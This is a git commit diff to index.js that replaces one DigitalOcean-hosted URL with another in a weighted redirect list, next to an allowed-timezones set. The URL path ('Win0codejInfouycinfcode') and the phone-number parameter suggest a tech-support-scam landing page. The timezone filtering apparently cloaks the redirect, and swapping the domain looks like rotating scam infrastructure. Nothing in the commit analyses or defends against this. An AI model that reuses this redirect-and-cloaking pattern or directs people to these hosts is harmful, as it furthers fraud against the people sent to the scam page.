f6ae638a1f9d7201e4c077fe097862e54ad8652e
paalakash <palaksh452@gmail.com>
2026-06-19 11:49:58 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://monkfish-app-f9bxp.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-414-5328", weight: 1.0 }
+    { url: "https://plankton-app-d4afy.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-414-5328", weight: 1.0 }
 
 ];
 
